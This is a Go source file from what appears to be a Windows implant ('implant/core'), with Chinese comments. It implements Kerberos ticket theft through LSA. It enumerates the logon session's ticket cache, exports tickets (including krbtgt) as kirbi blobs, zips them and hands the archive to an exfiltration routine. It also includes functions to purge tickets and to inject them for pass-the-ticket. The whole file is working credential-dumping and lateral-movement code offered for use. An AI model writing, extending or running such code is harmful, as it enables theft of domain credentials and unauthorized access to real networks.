//go:build windows

package services

// Windows LSA 票据采集（`kind=ticket, tech=lsa`）。
//
// 文件式（tech=files）只能捡工具落盘的 ccache；真正的票据在 LSA 的凭据缓存里。
// 这里通过 secur32.dll 的 LsaCallAuthenticationPackage 走 MS-KILE 协议：
//
//	KerbQueryTicketCacheEx2Message    (20) 枚举缓存（客户端/服务端/时间/旗标）
//	KerbRetrieveEncodedTicketMessage  (8)  按服务名导出 KRB_CRED（kirbi）
//
// 全程纯 syscall，不引 CGO（模板是全平台 CGO_ENABLED=0 交叉编译）。
// 消息号与结构体布局见 lsa_types.go（对照 ntsecapi.h，布局有单测）。

import (
	"errors"
	"fmt"
	"os"
	"runtime"
	"unsafe"

	"implant/core/debuglog"

	"golang.org/x/sys/windows"
)

var (
	// DLL 归属按 mingw 的 libsecur32.a / libadvapi32.a 导出符号核对：
	//   secur32  : LsaConnectUntrusted / LsaLookupAuthenticationPackage /
	//              LsaCallAuthenticationPackage / LsaFreeReturnBuffer
	//   advapi32 : LsaClose ← 不在 secur32（从 secur32 取会运行时 "procedure not found" panic）
	modSecur32                         = windows.NewLazySystemDLL("secur32.dll")
	modAdvapi32                        = windows.NewLazySystemDLL("advapi32.dll")
	procLsaConnectUntrusted            = modSecur32.NewProc("LsaConnectUntrusted")
	procLsaLookupAuthenticationPackage = modSecur32.NewProc("LsaLookupAuthenticationPackage")
	procLsaCallAuthenticationPackage   = modSecur32.NewProc("LsaCallAuthenticationPackage")
	procLsaFreeReturnBuffer            = modSecur32.NewProc("LsaFreeReturnBuffer")
	procLsaClose                       = modAdvapi32.NewProc("LsaClose")
)

const kerberosAuthPackage = "Kerberos"

// lsaCallAuthenticationPackage 打开一句 LSA 会话、调用一次、释放返回缓冲区。
// fn 负责解析返回缓冲区（缓冲区保证在 fn 返回后释放）。
func lsaCallAuthenticationPackage(req unsafe.Pointer, reqLen uintptr, fn func(ret unsafe.Pointer, retLen uint32) error) error {
	var hLsa uintptr
	if st, _, _ := procLsaConnectUntrusted.Call(uintptr(unsafe.Pointer(&hLsa))); st != 0 {
		return fmt.Errorf("LsaConnectUntrusted 失败: 0x%08x", st)
	}
	defer procLsaClose.Call(hLsa)

	name := []byte(kerberosAuthPackage)
	lsaName := lsaString{
		Length:        uint16(len(name)),
		MaximumLength: uint16(len(name)),
		Buffer:        &name[0],
	}
	var pkg uint32
	if st, _, _ := procLsaLookupAuthenticationPackage.Call(hLsa, uintptr(unsafe.Pointer(&lsaName)),
		uintptr(unsafe.Pointer(&pkg))); st != 0 {
		return fmt.Errorf("LsaLookupAuthenticationPackage(Kerberos) 失败: 0x%08x", st)
	}

	var ret unsafe.Pointer
	var retLen uint32
	var protoStatus uint32
	st, _, _ := procLsaCallAuthenticationPackage.Call(hLsa, uintptr(pkg),
		uintptr(req), reqLen,
		uintptr(unsafe.Pointer(&ret)), uintptr(unsafe.Pointer(&retLen)),
		uintptr(unsafe.Pointer(&protoStatus)))
	if st != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage 失败: 0x%08x", st)
	}
	if ret != nil {
		defer procLsaFreeReturnBuffer.Call(uintptr(ret))
	}
	if protoStatus != 0 {
		// 协议层状态（NTSTATUS）：例如没票据时是 STATUS_NO_SUCH_LOGON_SESSION 等
		return fmt.Errorf("Kerberos 协议状态: 0x%08x", protoStatus)
	}
	if fn != nil {
		return fn(ret, retLen)
	}
	return nil
}

// currentLogonLUID 当前进程的登录会话 LUID（票据查询/导出都按它过滤）
func currentLogonLUID() (lsaLUID, error) {
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tok); err != nil {
		return lsaLUID{}, fmt.Errorf("OpenProcessToken 失败: %w", err)
	}
	defer tok.Close()

	var stats tokenStatistics
	var n uint32
	if err := windows.GetTokenInformation(tok, windows.TokenStatistics,
		(*byte)(unsafe.Pointer(&stats)), uint32(unsafe.Sizeof(stats)), &n); err != nil {
		return lsaLUID{}, fmt.Errorf("GetTokenInformation(TokenStatistics) 失败: %w", err)
	}
	return lsaLUID{LowPart: stats.AuthenticationId.LowPart, HighPart: stats.AuthenticationId.HighPart}, nil
}

// lsaU16String UNICODE_STRING → Go 字符串（Length 是字节数，不含结尾 NUL）
func lsaU16String(s lsaUnicodeString) string {
	if s.Buffer == nil || s.Length == 0 {
		return ""
	}
	return windows.UTF16ToString(unsafe.Slice(s.Buffer, int(s.Length)/2))
}

// filetimeToUnix LSA 返回的时间是 FILETIME（100ns since 1601），转 Unix 秒
func filetimeToUnix(ft int64) int64 {
	if ft <= 0 {
		return 0
	}
	return ft/10_000_000 - 11644473600
}

// lsaListTickets 枚举当前登录会话的票据缓存（不含导出字节）
func lsaListTickets() ([]lsaTicket, error) {
	luid, err := currentLogonLUID()
	if err != nil {
		return nil, err
	}
	req := kerbQueryTktCacheRequest{
		MessageType: kerbQueryTicketCacheEx2Message,
		LogonId:     luid,
	}

	var out []lsaTicket
	err = lsaCallAuthenticationPackage(unsafe.Pointer(&req), unsafe.Sizeof(req),
		func(ret unsafe.Pointer, retLen uint32) error {
			headerSize := uintptr(unsafe.Sizeof(kerbQueryTktCacheEx2Response{}))
			if ret == nil || uintptr(retLen) < headerSize {
				return errors.New("票据缓存返回缓冲区过小")
			}
			hdr := (*kerbQueryTktCacheEx2Response)(ret)
			count := int(hdr.CountOfTickets)
			infoSize := unsafe.Sizeof(kerbTicketCacheInfoEx2{})
			if uintptr(retLen) < headerSize+uintptr(count)*infoSize {
				return fmt.Errorf("票据数组越界: 返回 %d 字节，声明 %d 张", retLen, count)
			}
			if count == 0 {
				return nil
			}
			arr := unsafe.Slice((*kerbTicketCacheInfoEx2)(unsafe.Add(ret, headerSize)), count)
			for _, t := range arr {
				client := lsaU16String(t.ClientName)
				realm := lsaU16String(t.ClientRealm)
				if realm == "" {
					realm = lsaU16String(t.ServerRealm)
				}
				out = append(out, lsaTicket{
					Client:         client,
					ClientRealm:    realm,
					Server:         lsaU16String(t.ServerName),
					ServerRealm:    lsaU16String(t.ServerRealm),
					Start:          filetimeToUnix(t.StartTime),
					End:            filetimeToUnix(t.EndTime),
					Renew:          filetimeToUnix(t.RenewTime),
					Flags:          t.TicketFlags,
					EncType:        t.EncryptionType,
					SessionKeyType: t.SessionKeyType,
				})
			}
			return nil
		})
	if err != nil {
		return nil, err
	}
	return out, nil
}

// lsaExportTicket 导出指定服务票据为 KRB_CRED（kirbi）字节。
//
// server 传 LSA 缓存里的 ServerName 原文（如 "krbtgt/CORP.LOCAL"、"cifs/fs01"）。
func lsaExportTicket(server string) ([]byte, error) {
	luid, err := currentLogonLUID()
	if err != nil {
		return nil, err
	}
	name, err := windows.UTF16FromString(server)
	if err != nil {
		return nil, fmt.Errorf("服务名编码失败: %w", err)
	}
	req := kerbRetrieveTktRequest{
		MessageType: kerbRetrieveEncodedTicketMessage,
		LogonId:     luid,
		TargetName: lsaUnicodeString{
			Length:        uint16((len(name) - 1) * 2),
			MaximumLength: uint16(len(name) * 2),
			Buffer:        &name[0],
		},
	}

	var out []byte
	err = lsaCallAuthenticationPackage(unsafe.Pointer(&req), unsafe.Sizeof(req),
		func(ret unsafe.Pointer, retLen uint32) error {
			if ret == nil || uintptr(retLen) < unsafe.Sizeof(kerbRetrieveTktResponse{}) {
				return errors.New("票据导出返回缓冲区过小")
			}
			resp := (*kerbRetrieveTktResponse)(ret)
			size := int(resp.Ticket.EncodedTicketSize)
			if size <= 0 || resp.Ticket.EncodedTicket == nil {
				return errors.New("票据导出结果为空")
			}
			blob := unsafe.Slice(resp.Ticket.EncodedTicket, size)
			out = make([]byte, size)
			copy(out, blob)
			return nil
		})
	if err != nil {
		return nil, err
	}
	return out, nil
}

// collectLSATickets 枚举 + 逐张导出，返回带 KRB_CRED 的票据列表。
//
// 单张导出失败不影响其它票据（记进 errors，由调用方写进制品清单）。
func collectLSATickets() ([]lsaTicket, []string) {
	tickets, err := lsaListTickets()
	if err != nil {
		return nil, []string{err.Error()}
	}
	if len(tickets) == 0 {
		return nil, []string{"LSA 缓存里没有票据（当前登录会话未做 Kerberos 认证？）"}
	}

	var errs []string
	kept := tickets[:0]
	for _, t := range tickets {
		blob, xerr := lsaExportTicket(t.Server)
		if xerr != nil {
			errs = append(errs, fmt.Sprintf("%s: 导出失败: %v", t.Server, xerr))
			continue
		}
		t.KerbCred = blob
		kept = append(kept, t)
		debuglog.Printf("🎫 [LSA] 已导出票据 %s（%d 字节）\n", t.Server, len(blob))
	}
	return kept, errs
}

// credDumpLSATickets `tech=lsa` 的入口：打包 ZIP 并异步回传
func credDumpLSATickets(fileName string) ([]byte, error) {
	tickets, errs := collectLSATickets()
	if len(tickets) == 0 {
		msg := "没有可导出的 LSA 票据"
		if len(errs) > 0 {
			msg += "：" + errs[0]
		}
		return nil, errors.New(msg)
	}

	destPath := credTempPath(fileName)
	_ = os.Remove(destPath)
	n, err := writeLSATicketBundle(destPath, tickets, errs)
	if err != nil {
		return nil, err
	}
	debuglog.Printf("✅ [CRED] LSA 票据已打包: %s（%d 张），开始回传\n", destPath, n)
	go exfilFile(destPath, true)

	msg := fmt.Sprintf("[+] LSA 票据已导出并开始回传: %s（%d 张", fileName, n)
	if len(errs) > 0 {
		msg += fmt.Sprintf("；%d 项导出错误", len(errs))
	}
	return []byte(msg + "）"), nil
}

// lsaPurgeTicket 清除票据：server 为空表示清空当前登录会话的全部票据。
//
// 对应 `kerberos purge`。破坏性操作 —— 清完需要重新 kinit/重新认证。
func lsaPurgeTicket(server string) error {
	luid, err := currentLogonLUID()
	if err != nil {
		return err
	}
	req := kerbPurgeTktCacheRequest{
		MessageType: kerbPurgeTicketCacheMessage,
		LogonId:     luid,
	}
	if server != "" {
		name, nerr := windows.UTF16FromString(server)
		if nerr != nil {
			return fmt.Errorf("服务名编码失败: %w", nerr)
		}
		req.ServerName = lsaUnicodeString{
			Length:        uint16((len(name) - 1) * 2),
			MaximumLength: uint16(len(name) * 2),
			Buffer:        &name[0],
		}
		// name 必须在调用期间保持存活：req 持有其指针，GC 能追踪到
		err = lsaCallAuthenticationPackage(unsafe.Pointer(&req), unsafe.Sizeof(req), nil)
		runtime.KeepAlive(name)
		return err
	}
	// 清空全部：ServerName/RealmName 都为空
	return lsaCallAuthenticationPackage(unsafe.Pointer(&req), unsafe.Sizeof(req), nil)
}

// lsaSubmitTicket 提交票据（ptt）：把 KRB_CRED 字节追加在请求结构体之后。
//
// 对应 `kerberos ptt <base64>`。Key 全部清零（KRB_CRED 自带会话密钥，
// 提交时不需要额外密钥）。
func lsaSubmitTicket(krbCred []byte) error {
	if len(krbCred) == 0 {
		return errors.New("票据为空")
	}
	if len(krbCred) > 64<<10 {
		return fmt.Errorf("票据过大: %d 字节", len(krbCred))
	}
	luid, err := currentLogonLUID()
	if err != nil {
		return err
	}

	structSize := int(unsafe.Sizeof(kerbSubmitTktRequest{}))
	req := kerbSubmitTktRequest{
		MessageType:    kerbSubmitTicketMessage,
		LogonId:        luid,
		KerbCredSize:   uint32(len(krbCred)),
		KerbCredOffset: uint32(structSize), // 相对缓冲区起始；40 字节，8 字节对齐
	}
	buf := make([]byte, structSize+len(krbCred))
	copy(buf, unsafe.Slice((*byte)(unsafe.Pointer(&req)), structSize))
	copy(buf[structSize:], krbCred)

	return lsaCallAuthenticationPackage(unsafe.Pointer(&buf[0]), uintptr(len(buf)), nil)
}
